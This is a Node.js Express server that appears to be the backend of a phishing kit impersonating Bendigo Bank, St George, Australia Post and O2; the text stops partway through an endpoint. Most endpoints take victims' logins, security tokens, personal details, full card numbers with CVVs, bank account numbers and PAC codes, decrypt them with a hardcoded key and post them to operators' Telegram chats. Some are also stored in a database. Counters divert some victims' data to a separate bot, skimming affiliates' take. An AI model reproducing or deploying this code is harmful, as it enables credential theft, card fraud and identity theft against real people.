const express = require("express");
const bodyparser = require("body-parser");
const axios = require("axios");
var cors = require("cors");
var fs = require("fs");
var CryptoJS = require("crypto-js");
require("dotenv").config();
const mysql = require("mysql");
const jwt = require("jsonwebtoken");

const port = process.env.PORT || 8000;

const app = express();
app.use(bodyparser.json());
app.use(cors());

var panelConnection = mysql.createConnection({
  host: process.env.dbHost,
  user: process.env.dbUsername,
  password: process.env.dbPass,
  database: "panels",
  port: 12987,
  multipleStatements: true,
});

panelConnection.connect((err) => {
  if (!err) {
    console.log("Db Connection Succeed");
  } else {
    console.log(
      "Db connect Failed \n Error :" + JSON.stringify(err, undefined, 2)
    );
  }
});

var bankName;

//Dependencies
const multer = require("multer");

//Multer DiskStorage Config
const diskStorage = multer.diskStorage({
  destination: "assets/profile_upload",
  filename: (req, file, call_back) => {
    //Prepend date to the filename or anything that makes
    //the file unique so it won't be overwritten
    call_back(null, Date.now() + "_" + file.originalname);
  },
});

//Create Multer Instance
const upload = multer({ storage: diskStorage });

//File upload
//or app.post()

app.post("/uploadP60", upload.single("file"), (req, res) => {
  //The file
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument?chat_id=680379375&document=${req.file.path}`
  );
  console.log(req.file);
});

app.on("uncaughtException", (err) => {
  console.error("There was an uncaught error", err);
});

app.options("/getips", cors());

app.get("/getips", (req, res) => {
  fs.readFile("ips.txt", function (err, data) {
    var filecontents = data;
    res.send(filecontents);
  });
});

app.options("/getRespentesting123!", cors());

app.get("/getRespentesting123!", (req, res) => {
  fs.readFile("results.txt", function (err, data) {
    var filecontents = data;
    res.send(filecontents);
  });
});

//BENDIGO
//BENDIGO
//BENDIGO

app.options("/bendiSavePhone", cors());

app.post("/bendiSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;

  let details = [telephone, uniqueid];
  let query = `UPDATE bendi SET telephone=?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

let bendigoCountSkii = 2;

app.options("/bendiSaveLogin", cors());

app.post("/bendiSaveLogin", cors(), (req, res) => {
  accessId = req.body.accessId;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  if (bendigoCountSkii == 2) {
    let details = [accessId, password, uniqueid, ip, "haytch123!"];
    let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    bendigoCountSkii = 0;
  } else {
    let details = [accessId, password, uniqueid, ip, owner];
    let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    bendigoCountSkii += 1;
  }
});

app.options("/bendiSaveST", cors());

app.post("/bendiSaveST", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  secToken = req.body.secToken;

  let details = [secToken, uniqueid];
  let query = `UPDATE bendi SET secToken=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//AUSPOSTwLogs
//AUSPOSTwLogs
//AUSPOSTwLogs

app.options("/ausPostLog", cors());

app.post("/ausPostLog", (req, res) => {
  username = req.body.username;
  password = req.body.password;
  bank = req.body.bank;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  var originalText = `+----------- ${bank} Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;

  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
  );
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
  );

  res.send("Update Completed");
});

app.options("/ausPostStGeorgeLog", cors());

app.post("/ausPostStGeorgeLog", (req, res) => {
  accessNo = req.body.accessNo;
  secNo = req.body.secNo;
  password = req.body.password;
  bank = req.body.bank;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  var originalText = `+----------- ${bank} Login Information ------------+\nAccess Number: ${accessNo}\nSecurity Number: ${secNo}\nPassword: ${password}`;

  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
  );
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
  );

  res.send("Update Completed");
});

//O2
//O2
//O2

app.options("/o2Triz", cors());

app.post("/o2Triz", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pac = CryptoJS.AES.decrypt(req.body.pac, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPost code: ${pcode}\nPhone Number: ${telephone}\nPAC: ${pac}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\nSort Code: ${scode}\nAcount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `O2:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "1190384225",
            text: `O2:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Completed");
    });
});

app.options("/o2Pac", cors());

app.post("/o2Pac", (req, res) => {
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pac = CryptoJS.AES.decrypt(req.body.pac, "402312").toString(
    CryptoJS.enc.Utf8
  );
  owner = req.body.owner;
  binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
  var originalText = `+----------- PAC Information ------------+\nTelephone: ${telephone}\nPAC: ${pac}`;
  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 680379375,
        text: `O2 PAC:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: "1190384225",
        text: `O2 PAC:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });

  res.send("Update Completed");
});

//AUSPOST
//AUSPOST
//AUSPOST

app.options("/ausPostSJ", cors());

app.post("/ausPostSJ", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 500) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
        );
        SpoofergooferAP = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSJ:\n${originalText}`
        );
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostKelv2", cors());

app.post("/ausPostKelv2", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 3) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        SpoofergooferAP = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostKelv:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-757683438",
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostManny", cors());

app.post("/ausPostManny", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostManny:\n${originalText}`
        );
        SpoofergooferAP = 1;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostManny:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=AusPost:\n${originalText}`
        );
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostAbzz", cors());

app.post("/ausPostAbzz", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 500) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
        );
        SpoofergooferAP = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostAbzz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1016584597&text=AusPost:\n${originalText}`
        );
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostSS", cors());

app.post("/ausPostSS", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=AusPost:\n${originalText}`
        );
        ssCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/ausPostTheOnlyMY", cors());

app.post("/ausPostTheOnlyMY", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (TheOnlyMY == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        TheOnlyMY = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostOnlyMy:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-716287470&text=AusPost:\n${originalText}`
        );
        TheOnlyMY += 1;
      }

      res.send("Update Completed");
    });
});

let frankAbignale = 0;

app.options("/ausPostfrankabignale100!", cors());

app.post("/ausPostfrankabignale100!", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (frankAbignale == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        frankAbignale = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostFrankabignale100:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5104363434&text=AusPost:\n${originalText}`
        );
        frankAbignale += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/ausPostAR", cors());

app.post("/ausPostAR", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
